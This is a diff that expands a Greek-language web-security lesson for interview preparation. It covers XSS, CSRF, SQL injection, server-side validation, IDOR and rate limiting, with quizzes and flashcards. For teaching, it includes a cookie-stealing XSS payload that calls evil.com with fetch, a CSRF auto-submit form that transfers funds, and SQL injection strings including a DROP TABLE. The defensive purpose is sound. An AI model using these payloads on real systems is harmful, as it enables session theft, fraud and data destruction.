@@ -1,119 +1,273 @@
 # Web Security Basics
 
-Security δεν είναι “θα το δούμε στο τέλος”. Κάθε fullstack developer πρέπει να ξέρει τα βασικά.
+Το security δεν είναι «θα το δούμε στο τέλος» — είναι τρόπος σκέψης που εφαρμόζεις σε κάθε feature. Στις συνεντεύξεις, τα XSS/CSRF/SQL injection είναι σταθερές ερωτήσεις, και ένας υποψήφιος που μπερδεύει το XSS με το CSRF χάνει αμέσως πόντους. Ο θεμελιώδης κανόνας πίσω από όλα: **ποτέ μην εμπιστεύεσαι input που έρχεται από τον client**.
 
-## XSS
+## XSS — Cross-Site Scripting
 
-Cross-site scripting συμβαίνει όταν untrusted input εκτελείται σαν JavaScript στο browser.
-
-Άμυνες:
-
-- escaping/sanitization,
-- όχι raw HTML από χρήστη,
-- Content Security Policy,
-- frameworks που κάνουν escaping by default.
-
-Παράδειγμα κινδύνου:
+**Τι είναι:** ο attacker καταφέρνει να εκτελεστεί **δικό του JavaScript στον browser ενός άλλου χρήστη**, μέσα στο context του site σου. Από εκεί μπορεί να κλέψει δεδομένα, να κάνει requests «ως ο χρήστης», να παραποιήσει τη σελίδα.
 
 ```html
+<!-- ❌ Ο κλασικός τρόπος να αυτοκτονήσεις -->
 <div id="comment"></div>
 <script>
-  comment.innerHTML = userInput;
+  comment.innerHTML = userInput; // αν περιέχει <img src=x onerror="...">
+                                  // ο κώδικας του attacker τρέχει!
 </script>
 ```
 
-Αν το `userInput` περιέχει `<script>...</script>`, μπορεί να εκτελεστεί κώδικας. Σε React, το default rendering κάνει escaping, αλλά `dangerouslySetInnerHTML` χρειάζεται πολύ προσοχή και sanitization.
+Παράδειγμα επίθεσης: χρήστης υποβάλλει σχόλιο `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`. Κάθε επισκέπτης που βλέπει το σχόλιο στέλνει τα cookies του στον attacker.
 
-## CSRF
+Τα τρία είδη που αξίζει να ονομάσεις σε συνέντευξη:
 
-CSRF είναι όταν τρίτο site προσπαθεί να κάνει request με τα cookies του χρήστη.
+- **Stored XSS**: το payload αποθηκεύεται (σχόλιο στη DB) και χτυπά κάθε επισκέπτη — το χειρότερο.
+- **Reflected XSS**: το payload ταξιδεύει στο URL/request και «καθρεφτίζεται» στη σελίδα (π.χ. σελίδα αποτελεσμάτων αναζήτησης).
+- **DOM-based XSS**: το sink είναι καθαρά client-side (π.χ. `innerHTML` με δεδομένα από `location.hash`).
 
-Άμυνες:
+**Άμυνες, με σειρά σημασίας:**
 
-- SameSite cookies,
-- CSRF tokens,
-- έλεγχος origin/referer σε sensitive actions.
+1. **Output encoding/escaping by default** — το React/Vue/Angular κάνουν escape ό,τι μπαίνει σε JSX. Το `{userInput}` είναι ασφαλές· το `dangerouslySetInnerHTML` είναι το «παραθυράκι» και θέλει sanitization (π.χ. DOMPurify) πριν.
+2. **Content Security Policy (CSP)** — HTTP header που λέει στον browser «εκτέλεσε scripts μόνο από αυτά τα origins». Δεύτερη γραμμή άμυνας αν κάτι ξεφύγει.
+3. **HttpOnly cookies** — ακόμα κι αν πετύχει XSS, δεν μπορεί να διαβάσει το session cookie.
 
-Το CSRF είναι πιο σχετικό όταν χρησιμοποιείς cookies για auth, επειδή ο browser τα στέλνει αυτόματα. Για sensitive actions όπως αλλαγή email ή πληρωμή, θέλεις επιπλέον προστασία.
+```tsx
+// React: ασφαλές by default
+<p>{comment.text}</p>                                 // ✅ escaped
 
-## Validation
+// Το παραθυράκι — μόνο με sanitization
+<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
+```
 
-Πρέπει να κάνεις validation server-side. Client-side validation είναι για UX, όχι για security.
+## CSRF — Cross-Site Request Forgery
 
-Παράδειγμα server-side thinking:
+**Τι είναι:** κακόβουλο site κάνει τον browser σου να στείλει **request στο δικό σου site, με τα δικά σου cookies** — χωρίς να το ξέρεις.
+
+Σενάριο: είσαι logged in στο `mybank.com` (session cookie). Επισκέπτεσαι το `evil.com`, που περιέχει:
+
+```html
+<form action="https://mybank.com/transfer" method="POST" id="f">
+  <input type="hidden" name="to" value="attacker" />
+  <input type="hidden" name="amount" value="1000" />
+</form>
+<script>document.getElementById("f").submit();</script>
+```
+
+Ο browser στέλνει **αυτόματα** τα cookies του mybank.com μαζί με το request — ο server βλέπει «έγκυρο» logged-in request.
+
+Η κρίσιμη διάκριση από το XSS: στο **XSS ο attacker τρέχει κώδικα στο site σου**· στο **CSRF εκμεταλλεύεται το ότι ο browser στέλνει cookies αυτόματα**, χωρίς να τρέξει κώδικα στο site σου και χωρίς να μπορεί να δει το response.
+
+**Άμυνες:**
+
+1. **SameSite cookies** (`Lax`/`Strict`) — το cookie δεν στέλνεται σε cross-site requests. Το `Lax` είναι default στους σύγχρονους browsers και κόβει το παραπάνω σενάριο.
+2. **CSRF tokens** — τυχαίο token στη φόρμα που ο server επαληθεύει· το evil.com δεν μπορεί να το διαβάσει.
+3. **Έλεγχος `Origin`/`Referer`** header σε sensitive actions.
+4. Token auth σε `Authorization` header (αντί cookies) δεν έχει CSRF πρόβλημα — ο browser δεν το στέλνει αυτόματα.
+
+<Exercise
+  question="Ποια είναι η βασική διαφορά XSS και CSRF;"
+  options={[
+    "Καμία — είναι το ίδιο με άλλο όνομα.",
+    "XSS: εκτέλεση ξένου κώδικα στον browser του θύματος μέσα στο site σου. CSRF: εξαπάτηση του browser να στείλει authenticated request χωρίς ο attacker να τρέξει κώδικα στο site σου.",
+    "Το XSS αφορά μόνο SQL databases, το CSRF μόνο cookies."
+  ]}
+  correctOptionIndex={1}
+  explanation="Σωστά. XSS = code injection στο frontend σου (άμυνα: escaping, CSP). CSRF = κατάχρηση των αυτόματων cookies (άμυνα: SameSite, CSRF tokens). Διαφορετικές επιθέσεις, διαφορετικές άμυνες."
+/>
+
+## SQL Injection — το παλιότερο και ακόμα ζωντανό
+
+**Τι είναι:** user input «δραπετεύει» από τη θέση δεδομένων και γίνεται μέρος του SQL:
+
+```js
+// ❌ String concatenation — ΠΟΤΕ
+const query = `SELECT * FROM users WHERE email = '${email}'`;
+// email = "' OR '1'='1' --"  →  επιστρέφει ΟΛΟΥΣ τους users
+// email = "'; DROP TABLE users; --"  →  χειρότερα
+
+// ✅ Parameterized queries — τα δεδομένα ΔΕΝ γίνονται ποτέ κώδικας
+const result = await db.query("SELECT * FROM users WHERE email = $1", [email]);
+```
+
+Με **parameterized queries** (ή ORM που τα χρησιμοποιεί από κάτω), η βάση μεταγλωττίζει το query χωριστά από τα δεδομένα — το input δεν μπορεί να αλλάξει τη δομή του query, ό,τι κι αν περιέχει. Αυτή είναι η ολοκληρωμένη απάντηση: όχι «κάνω escape τα quotes», αλλά «διαχωρίζω κώδικα από δεδομένα».
+
+## Validation: server-side, πάντα
+
+Client-side validation είναι **UX**, όχι security — ο καθένας στέλνει ό,τι θέλει με curl:
 
 ```ts
-function validateTaskTitle(title: unknown) {
-  if (typeof title !== "string" || title.trim().length < 2) {
-    throw new Error("Title must be at least 2 characters");
+// Με schema validator (Zod) — ένα schema, validation + types μαζί
+import { z } from "zod";
+
+const CreateTaskSchema = z.object({
+  title: z.string().trim().min(2).max(200),
+  dueDate: z.coerce.date().optional(),
+});
+
+app.post("/tasks", (req, res) => {
+  const parsed = CreateTaskSchema.safeParse(req.body);
+  if (!parsed.success) {
+    return res.status(422).json({ error: parsed.error.flatten() });
   }
-}
+  // parsed.data: typed ΚΑΙ validated — ΜΟΝΟ τα δηλωμένα fields
+});
 ```
 
-Ο client μπορεί να στείλει ό,τι θέλει με curl, Postman ή custom script. Ο server είναι το boundary που πρέπει να προστατεύει τα δεδομένα.
+Σημαντική λεπτομέρεια: το schema με «allowed fields» προστατεύει και από **mass assignment** — χωρίς αυτό, ένα `{ "role": "admin" }` στο body μπορεί να περάσει κατευθείαν στο `db.update(req.body)`.
 
-## Secrets
+## Secrets & sensitive data
 
-API keys, database URLs, OAuth secrets:
+- **Ό,τι φτάνει στο frontend bundle είναι δημόσιο** — API keys, ακόμα και σε «κρυφό» αρχείο, διαβάζονται από το DevTools. Secrets μόνο server-side.
+- **Όχι secrets στο Git** — `.env` στο `.gitignore`, secret manager σε production. Αν διαρρεύσει key, γίνεται rotate, όχι απλά delete του commit (μένει στο history).
+- **Generic error messages προς τα έξω** — το `"Invalid credentials"` αντί για `"Wrong password for user X"`, και ποτέ stack traces σε production responses.
+- **Logs χωρίς PII/secrets** — όχι passwords, tokens, πλήρη emails σε log lines.
 
-- όχι στο frontend bundle,
-- όχι σε Git,
-- χρήση environment variables/secret manager.
+## Authorization σε κάθε layer — όχι μόνο login
 
-## Authorization
-
-Security δεν είναι μόνο login. Πρέπει να ελέγχεις αν ο χρήστης έχει δικαίωμα για το συγκεκριμένο resource.
+Το πιο συχνό πραγματικό bug σε web apps δεν είναι το XSS — είναι το **IDOR**: ο server ελέγχει «είσαι logged in;» αλλά όχι «σου ανήκει;»:
 
 ```ts
-if (task.userId !== currentUser.id) {
-  return Response.json({ error: "Forbidden" }, { status: 403 });
-}
+// ❌ IDOR: οποιοσδήποτε logged-in χρήστης διαβάζει ΚΑΘΕ task
+app.get("/api/tasks/:id", auth, async (req, res) => {
+  const task = await db.task.findUnique({ where: { id: req.params.id } });
+  res.json(task);
+});
+
+// ✅ Ownership check στο query
+app.get("/api/tasks/:id", auth, async (req, res) => {
+  const task = await db.task.findFirst({
+    where: { id: req.params.id, userId: req.user.id },
+  });
+  if (!task) return res.status(404).json({ error: "Not found" });
+  res.json(task);
+});
 ```
 
-Χωρίς αυτό, ένας logged-in χρήστης μπορεί να δοκιμάσει IDs άλλων χρηστών.
+## Rate limiting & brute force
+
+Login endpoints χωρίς rate limit = δωρεάν password guessing. Βασική προστασία:
+
+- Rate limit ανά IP **και** ανά λογαριασμό στο `/login` (π.χ. 5 αποτυχίες → cooldown).
+- Ίδιος χρόνος απόκρισης και ίδιο μήνυμα είτε υπάρχει ο user είτε όχι (όχι user enumeration).
+- Captcha/προοδευτικές καθυστερήσεις μετά από αποτυχίες.
+
+<PredictOutput
+  title="Spot the vulnerability"
+  code={`app.get("/search", (req, res) => {
+  const q = req.query.q;
+  res.send(\`
+    <h1>Results for: \${q}</h1>
+    <ul>...</ul>
+  \`);
+});
+
+// Ο attacker στέλνει σε θύμα το link:
+// /search?q=<script>fetch('//evil.com?c='+document.cookie)</script>`}
+  options={[
+    "Reflected XSS — το q μπαίνει στο HTML χωρίς escaping",
+    "SQL injection — το q πάει στη βάση",
+    "CSRF — λείπει το token",
+    "IDOR — δεν ελέγχεται το ownership"
+  ]}
+  correctOptionIndex={0}
+  answer="Reflected XSS"
+  explanation="Το query param καθρεφτίζεται αυτούσιο στο HTML response — το script του attacker εκτελείται στον browser του θύματος που πάτησε το link. Fix: HTML-escape το q πριν μπει στο template (ή template engine με auto-escaping) + CSP ως δεύτερη γραμμή."
+/>
 
 ## Mini project: secure form handling
 
-Πάρε ένα contact form και πρόσθεσε:
+Πάρε ένα contact/comment form και θωράκισέ το:
 
-1. Server-side validation για όλα τα fields.
-2. Escaped rendering για submitted data.
-3. Rate limit ή basic spam protection.
-4. Error responses χωρίς sensitive details.
-5. Logging χωρίς email body ή secrets.
+1. Server-side validation με schema (Zod) — μόνο allowed fields.
+2. Escaped rendering των submitted data (και απόδειξε το: υπέβαλε `<script>alert(1)</script>` και δες το ως κείμενο).
+3. Parameterized queries για την αποθήκευση.
+4. Rate limit στο endpoint.
+5. Error responses χωρίς λεπτομέρειες υλοποίησης· logging χωρίς ευαίσθητα δεδομένα.
 
-## Security checklist
+## Security checklist για κάθε feature
 
-- Validate input server-side.
-- Escape output.
-- Keep secrets out of frontend and Git.
-- Use secure cookies.
-- Enforce authorization on API/database layer.
-- Return generic errors για sensitive failures.
-
-## Interview answer template
-
-> I validate input on the server, avoid exposing secrets to the client, rely on framework escaping to reduce XSS risk, use secure cookies and CSRF protection where needed, and enforce authorization server-side.
+- Validate input server-side (schema, allowed fields).
+- Escape output — εμπιστεύσου το framework, πρόσεχε τα «παραθυράκια».
+- Parameterized queries — ποτέ string concatenation σε SQL.
+- Secrets μόνο server-side, ποτέ σε Git.
+- Cookies: `HttpOnly` + `Secure` + `SameSite`.
+- Authorization (ownership/role) σε κάθε query, όχι μόνο authentication.
+- Rate limiting σε auth και ακριβά endpoints.
+- Generic errors προς τα έξω, λεπτομέρειες μόνο σε server logs.
 
 <Exercise
   question="Γιατί δεν αρκεί client-side validation;"
   options={[
-    "Επειδή ο client μπορεί να παρακαμφθεί, άρα χρειάζεται server-side validation.",
-    "Επειδή δεν δουλεύει σε Chrome.",
-    "Επειδή αλλάζει το font."
+    "Επειδή ο client παρακάμπτεται πλήρως — οποιοσδήποτε στέλνει raw requests με curl/Postman. Ο server είναι το μόνο αξιόπιστο boundary.",
+    "Επειδή το JavaScript είναι αργό.",
+    "Αρκεί, αν χρησιμοποιείς TypeScript."
   ]}
   correctOptionIndex={0}
-  explanation="Σωστά. Ο server δεν πρέπει να εμπιστεύεται ποτέ input επειδή πέρασε frontend validation."
+  explanation="Σωστά. Το frontend validation βελτιώνει το UX (άμεσο feedback), αλλά ο server ΔΕΝ ξέρει αν το request ήρθε από το UI σου ή από script. Κάθε έλεγχος που έχει σημασία επαναλαμβάνεται server-side."
 />
 
-<Exercise
-  question="Πού δεν πρέπει να μπαίνουν API secrets;"
-  options={["Στο public frontend bundle", "Σε server env vars", "Σε secret manager"]}
-  correctOptionIndex={0}
-  explanation="Σωστά. Ό,τι μπει στο frontend μπορεί να το δει ο χρήστης."
+<Flashcards
+  title="Web Security — interview drills"
+  cards={[
+    {
+      question: "Stored vs Reflected vs DOM-based XSS;",
+      answer: "Stored: το payload αποθηκεύεται (DB) και χτυπά κάθε επισκέπτη. Reflected: ταξιδεύει στο URL/request και καθρεφτίζεται στο response — θέλει να πατήσει το θύμα link. DOM-based: το injection γίνεται καθαρά client-side (innerHTML + location.hash), δεν περνά καν από τον server."
+    },
+    {
+      question: "Πώς προστατεύει το parameterized query από SQL injection;",
+      answer: "Το SQL στέλνεται στη βάση χωριστά από τις τιμές — η βάση κάνει compile το query και δένει τα δεδομένα ως δεδομένα. Το input δεν μπορεί να αλλάξει τη δομή του query, οπότε το ' OR 1=1 -- είναι απλώς ένα περίεργο string."
+    },
+    {
+      question: "Τι κάνει το Content Security Policy;",
+      answer: "HTTP header που περιορίζει από πού φορτώνονται/εκτελούνται resources (script-src, img-src κ.λπ.). Δεύτερη γραμμή άμυνας κατά XSS: ακόμα κι αν περάσει injected script, ο browser αρνείται να το εκτελέσει αν δεν επιτρέπεται από το policy."
+    },
+    {
+      question: "Γιατί τα SameSite cookies κόβουν το CSRF;",
+      answer: "Το CSRF βασίζεται στο ότι ο browser στέλνει cookies αυτόματα σε κάθε request προς το site. Με SameSite=Lax/Strict, το cookie ΔΕΝ συνοδεύει cross-site requests (π.χ. auto-submit form από evil.com) — το request φτάνει χωρίς session, άρα απορρίπτεται."
+    },
+    {
+      question: "Τι είναι το mass assignment και πώς το αποφεύγεις;",
+      answer: "Πέρασμα ολόκληρου του req.body σε create/update — ο client προσθέτει fields που δεν έπρεπε (role: 'admin'). Άμυνα: schema validation με ρητά allowed fields (whitelist), ποτέ db.update(req.body) απευθείας."
+    },
+    {
+      question: "Ο χρήστης ζητά /api/invoices/882 που ανήκει σε άλλον και την παίρνει. Τι ευπάθεια και τι fix;",
+      answer: "IDOR (Insecure Direct Object Reference / Broken Access Control — #1 στο OWASP Top 10). Fix: ownership check σε κάθε query (WHERE userId = currentUser.id) και 404/403 αλλιώς. Bonus: μη-προβλέψιμα ids (UUID) δυσκολεύουν το guessing αλλά ΔΕΝ αντικαθιστούν τον έλεγχο."
+    },
+    {
+      question: "Τι είναι το OWASP Top 10;",
+      answer: "Η πιο γνωστή λίστα με τις 10 κρισιμότερες κατηγορίες ευπαθειών web εφαρμογών (Broken Access Control, Injection, Cryptographic Failures, SSRF κ.ά.). Αναφορά της σε συνέντευξη δείχνει security awareness — καλό να ξέρεις 3-4 κατηγορίες με παράδειγμα."
+    }
+  ]}
 />
 
-<div className="mt-12 flex flex-col sm:flex-row justify-between items-center gap-4 border-t border-gray-200 pt-6">
-  <a href="../../" className="text-gray-500 hover:text-gray-900 font-medium">← Πίσω στο Roadmap</a>
-  <CompleteLessonButton lessonId="web-security" />
-</div>
+## Πώς απαντάς στη συνέντευξη
+
+> I treat all client input as untrusted. Input is validated server-side with a schema and explicit allowed fields, queries are parameterized so injection is structurally impossible, and output is escaped by default — with CSP as a second layer against XSS. Cookies are HttpOnly, Secure, and SameSite, which also covers CSRF. And beyond authentication, every query enforces ownership, because broken access control — IDOR — is the most common real-world vulnerability.
+
+<TrainingLab
+  title="Κάνε security review σε φόρμα σχολίων"
+  scenario="Έχεις comment form που δέχεται user input και το εμφανίζει σε άλλους. Βρες XSS, validation, auth και rate-limit risks."
+  outcomes={[
+    "Να σκέφτεσαι input ως untrusted.",
+    "Να ξεχωρίζεις validation, sanitization και output encoding.",
+    "Να βάζεις security checks server-side."
+  ]}
+  steps={[
+    "Γράψε τι input δέχεται η φόρμα και ποιο είναι επικίνδυνο.",
+    "Πρόσθεσε server-side validation με schema και allowed fields.",
+    "Σχεδίασε output encoding για HTML display — δοκίμασε <script>alert(1)</script>.",
+    "Έλεγξε την αποθήκευση: parameterized query ή ORM;",
+    "Πρόσθεσε auth, ownership check στο delete, και rate limit."
+  ]}
+  checkpoints={[
+    "Το backend απορρίπτει invalid input ακόμα κι αν το frontend παρακαμφθεί.",
+    "Το rendered comment δεν εκτελεί script.",
+    "Ο χρήστης δεν μπορεί να σβήσει σχόλιο άλλου (όχι IDOR).",
+    "Τα errors δεν αποκαλύπτουν secrets ή stack traces."
+  ]}
+  mistakes={[
+    "Να εμπιστεύεσαι client-side validation.",
+    "Να κάνεις dangerouslySetInnerHTML χωρίς sanitization.",
+    "Να φτιάχνεις SQL με string concatenation.",
+    "Να βάζεις secrets σε δημόσιο bundle."
+  ]}
+  mastery="Το μάθημα έχει πετύχει όταν μπορείς να κοιτάξεις ένα feature και να γράψεις τουλάχιστον πέντε abuse cases πριν το υλοποιήσεις."
+/>
